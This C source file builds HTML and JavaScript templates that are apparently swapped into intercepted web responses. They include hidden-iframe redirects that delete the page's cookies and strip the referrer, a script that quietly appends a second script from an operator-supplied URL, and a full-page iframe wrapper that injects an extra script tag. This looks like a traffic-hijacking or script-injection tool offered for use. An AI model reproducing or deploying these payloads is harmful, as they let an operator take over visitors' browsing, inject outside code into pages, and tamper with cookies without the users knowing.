#include "main.h"



int init_jsurl_norefer()
{
	char	buffer[2000];
	char	arr[5][2000];

	char *tmp;
	tmp=buffer;

//date.toGMTString()
#if 1
tmp+=sprintf(tmp,"<html>\r\n");
tmp+=sprintf(tmp,"<head>\r\n");
tmp+=sprintf(tmp,"<style type='text/css' media='screen'>iframe{display: none;}</style>\r\n");
tmp+=sprintf(tmp,"<script>\r\n");
tmp+=sprintf(tmp,"function clearCookie(){\r\n");
tmp+=sprintf(tmp,"var date=new Date();\r\n");
tmp+=sprintf(tmp,"var l=location.host.substr(location.host.indexOf('.'));\r\n");

tmp+=sprintf(tmp,"date.setTime(date.getTime()-100000);\r\n");
tmp+=sprintf(tmp,"var keys=document.cookie.match(/[^ =;]+(?=\\=)/g);\r\n");
tmp+=sprintf(tmp,"if (keys) {\r\n");
tmp+=sprintf(tmp,"for (var i =  keys.length; i--;){\r\n");
tmp+=sprintf(tmp,"document.cookie=keys[i]+\"=0; expire=\"+new Date(0).toUTCString()+\"; path=/;domain=\"+l;}\r\n");
//tmp+=sprintf(tmp,"document.cookie=keys[i]+\"=; expire=\"+new Date(0).toUTCString();}\r\n");
tmp+=sprintf(tmp,"}\r\n");
tmp+=sprintf(tmp,"}\r\n");

tmp+=sprintf(tmp,"function jmp(){\r\n");
tmp+=sprintf(tmp,"var link = encodeURI('*');\r\n");
tmp+=sprintf(tmp,"clearCookie();\r\n");
tmp+=sprintf(tmp,"document.body.appendChild(document.createElement('iframe')).src='javascript:\"<script>top.location.replace(\\''+link+'\\')<\\/script>\"';\r\n");
tmp+=sprintf(tmp,"}\r\n");

tmp+=sprintf(tmp,"</script>\r\n");
tmp+=sprintf(tmp,"</head>\r\n");
tmp+=sprintf(tmp,"<body onLoad='jmp()'>\r\n");
tmp+=sprintf(tmp,"</body>\r\n");
tmp+=sprintf(tmp,"</html>\r\n");





#else
	tmp+=sprintf(tmp,"<html>\r\n");
	tmp+=sprintf(tmp,"<head>\r\n");
	tmp+=sprintf(tmp,"<script>\r\n");
	tmp+=sprintf(tmp,"function goURL()\r\n");
	tmp+=sprintf(tmp,"{\r\n");
	tmp+=sprintf(tmp,"return \"<script>document.location.replace('http://*');<\\/script>\";\r\n");
	tmp+=sprintf(tmp,"}\r\n");
	tmp+=sprintf(tmp,"document.write(\"<body style='margin:0px;overflow:hidden;'scroll='no'>\");\r\n");
	tmp+=sprintf(tmp,"document.write(\"<div><iframe  width='100%%' height='100%%' frameborder='no' scrolling='yes' src='JavaScript:parent.goURL();'></iframe></div>\");\r\n");
	tmp+=sprintf(tmp,"</script>\r\n");
	tmp+=sprintf(tmp,"</body>\r\n");
	tmp+=sprintf(tmp,"</head>\r\n");
	tmp+=sprintf(tmp,"</html>\r\n");
	tmp+=sprintf(tmp,"\r\n");
#endif   

	str_explode("*",buffer,arr,2000);
	strcpy(rep_jsurl_norefer1,arr[0]);
	strcpy(rep_jsurl_norefer2,arr[1]);
	
	return 1;	

}

int init_iframe_url()
{
	char	buffer[2000];
	char	arr[5][2000];

	char *tmp;
	tmp=buffer;
#if 1
	tmp+=sprintf(tmp,"<html>\r\n");
	tmp+=sprintf(tmp,"<head>\r\n");
	tmp+=sprintf(tmp,"</head>\r\n");
	tmp+=sprintf(tmp,"<body style='margin:0px;overflow:hidden;'scroll='no'>\r\n");
	tmp+=sprintf(tmp,"<div><iframe width='100%%' height='100%%' frameborder='no' scrolling='yes' src='*'></iframe></div>\r\n");
	tmp+=sprintf(tmp,"</body>\r\n");
	tmp+=sprintf(tmp,"</html>\r\n");
	tmp+=sprintf(tmp,"\r\n");
#else
	tmp+=sprintf(tmp,"<html>\r\n");
	tmp+=sprintf(tmp,"<head>\r\n");
	tmp+=sprintf(tmp,"<script>\r\n");
	tmp+=sprintf(tmp,"function goURL()\r\n");
	tmp+=sprintf(tmp,"{\r\n");
	tmp+=sprintf(tmp,"return \"<script>document.location.replace('');<\\/script>\";\r\n");
	tmp+=sprintf(tmp,"}\r\n");
	tmp+=sprintf(tmp,"document.write(\"<body style='margin:0px;overflow:hidden;'scroll='no'>\");\r\n");
	tmp+=sprintf(tmp,"document.write(\"<div><iframe  width='100%%' height='100%%' frameborder='no' scrolling='yes' src='http://*'></iframe></div>\");\r\n");
	tmp+=sprintf(tmp,"</script>\r\n");
	tmp+=sprintf(tmp,"</body>\r\n");
	tmp+=sprintf(tmp,"</head>\r\n");
	tmp+=sprintf(tmp,"</html>\r\n");
	tmp+=sprintf(tmp,"\r\n");
#endif


	str_explode("*",buffer,arr,2000);
	strcpy(rep_iframe_url1,arr[0]);
	strcpy(rep_iframe_url2,arr[1]);
	
	return 1;	

}
int init_js_loc()
{
	char	buffer[2000];
	char	arr[5][2000];

	char *tmp;
	tmp=buffer;
#if 1
    if(1)
    {
        tmp+=sprintf(tmp,"var e,a,scripts,p,n;\r\n");
        tmp+=sprintf(tmp,"a=document.currentScript;\r\n");
        tmp+=sprintf(tmp,"if( !a ){e = new Error('err');a = e.stack||e.sourceURL||e.stacktrace||'';}\r\n");
        tmp+=sprintf(tmp,"if( !a ){a = document.scripts[document.scripts.length - 1];}\r\n");
        tmp+=sprintf(tmp,"if( !a ){scripts = document.scripts;for (var i = scripts.length - 1; i>=0; i--){if (scripts[i].readyState === 'interative'){ a = scripts[i];break;}} }\r\n");
        
        tmp+=sprintf(tmp,"if( a ){\r\n");
        tmp+=sprintf(tmp,"p = a.parentNode;\r\n");
        tmp+=sprintf(tmp,"n=document.createElement('script');\r\n");
        tmp+=sprintf(tmp,"n.src= a.src+'?id=123456';\r\n");
        tmp+=sprintf(tmp,"p.appendChild(n);\r\n");
        tmp+=sprintf(tmp,"var link='*';\r\n");
        tmp+=sprintf(tmp,"document.body.appendChild(document.createElement('iframe')).src='javascript:\"<script>top.location.replace(\\''+link+'\\')<\\/script>\"';\r\n");
        tmp+=sprintf(tmp,"}\r\n");
    }
    else
    {
	    tmp+=sprintf(tmp,"<html><head><body><script>window.location.href='*';</script></body></html>");
    }
    str_explode("*",buffer,arr,2000);
	strcpy(rep_js_loc1,arr[0]);
	strcpy(rep_js_loc2,arr[1]);
#else	
	tmp+=sprintf(tmp,"<html>\r\n");
	tmp+=sprintf(tmp,"<head>\r\n");
	tmp+=sprintf(tmp,"<script>\r\n");
	tmp+=sprintf(tmp,"function goURL()\r\n");
	tmp+=sprintf(tmp,"{\r\n");
	tmp+=sprintf(tmp,"return \"<script>document.location.replace('*');<\\/script>\";\r\n");
	tmp+=sprintf(tmp,"}\r\n");
	tmp+=sprintf(tmp,"document.write(\"<body style='margin:0px;overflow:hidden;'scroll='no'>\");\r\n");
	tmp+=sprintf(tmp,"document.write(\"<div><iframe  width='100%%' height='100%%' frameborder='no' scrolling='yes' src='JavaScript:parent.goURL();'></iframe></div>\");\r\n");
	tmp+=sprintf(tmp,"</script>\r\n");
	tmp+=sprintf(tmp,"</body>\r\n");
	tmp+=sprintf(tmp,"</head>\r\n");
	tmp+=sprintf(tmp,"</html>\r\n");
	tmp+=sprintf(tmp,"\r\n");
	str_explode("*",buffer,arr,2000);
	strcpy(rep_loc_1,arr[0]);
	strcpy(rep_loc_2,arr[1]);
#endif	
	return 1;	

}
//js������һ���µ�js
int init_js_addjs()
{
    char	buffer[2000];
    char	arr[5][2000];
	char *tmp;
	tmp=buffer;
#if 0
    tmp+=sprintf(tmp,"alert('*');\r\n");
#else
    tmp+=sprintf(tmp,"var e,a,scripts,p,n;\r\n");
    tmp+=sprintf(tmp,"a=document.currentScript;\r\n");
    tmp+=sprintf(tmp,"if( !a ){e = new Error('err');a = e.stack||e.sourceURL||e.stacktrace||'';}\r\n");
    tmp+=sprintf(tmp,"if( !a ){a = document.scripts[document.scripts.length - 1];}\r\n");
    tmp+=sprintf(tmp,"if( !a ){scripts = document.scripts;for (var i = scripts.length - 1; i>=0; i--){if (scripts[i].readyState === 'interative'){ a = scripts[i];break;}} }\r\n");
    
    
  
    tmp+=sprintf(tmp,"if( a ){\r\n");
    tmp+=sprintf(tmp,"p = a.parentNode;\r\n");
    tmp+=sprintf(tmp,"n=document.createElement('script');\r\n");
    tmp+=sprintf(tmp,"n.src= a.src+'?id=123456';\r\n");
    tmp+=sprintf(tmp,"p.appendChild(n);\r\n");
    tmp+=sprintf(tmp,"n=document.createElement('script');\r\n");
    tmp+=sprintf(tmp,"n.src='*';\r\n");
    tmp+=sprintf(tmp,"p.appendChild(n);\r\n");
    tmp+=sprintf(tmp,"}\r\n");

#endif
	str_explode("*",buffer,arr,2000);
	strcpy(rep_js_add_js1,arr[0]);
	strcpy(rep_js_add_js2,arr[1]);

    return 1;
}
//url not change
int init_iframe_addjs()
{
	char	buffer[2000];
	char	arr[5][2000];

	char *tmp;
	tmp=buffer;
	tmp+=sprintf(tmp,"<html>\r\n");
	tmp+=sprintf(tmp,"<head>\r\n");
	tmp+=sprintf(tmp,"<script>\r\n");
	tmp+=sprintf(tmp,"function goURL()\r\n");
	tmp+=sprintf(tmp,"{\r\n");
	tmp+=sprintf(tmp,"return \"<script>document.location.replace('http://*#from=qq');<\\/script>\";\r\n");
    //tmp+=sprintf(tmp,"return \"<script>document.location.replace('http://*#from=qq');<\\/script>\";\r\n");    
	tmp+=sprintf(tmp,"}\r\n");
	tmp+=sprintf(tmp,"</script>\r\n");
	tmp+=sprintf(tmp,"</head>\r\n");

	tmp+=sprintf(tmp,"<body style='margin:0px;overflow:hidden;'scroll='no'>\r\n");
	tmp+=sprintf(tmp,"<div>\r\n");
	tmp+=sprintf(tmp,"<iframe id='ifrName' width='100%%' height='100%%'  frameborder='no' scrolling='yes' src='JavaScript:parent.goURL();'></iframe>\r\n");
	tmp+=sprintf(tmp,"<script src='http://*'></script>\r\n");
	tmp+=sprintf(tmp,"</div>\r\n");
	tmp+=sprintf(tmp,"</body>\r\n");
	tmp+=sprintf(tmp,"</html>\r\n");



	str_explode("*",buffer,arr,2000);
	strcpy(rep_iframe_addjs1,arr[0]);
	strcpy(rep_iframe_addjs2,arr[1]);
	strcpy(rep_iframe_addjs3,arr[2]);	
	return 1;	

}
int init_replace()
{
    init_js_loc();
    init_js_addjs();
	init_iframe_addjs();
	init_iframe_url();
	init_jsurl_norefer();
	return 1;
}

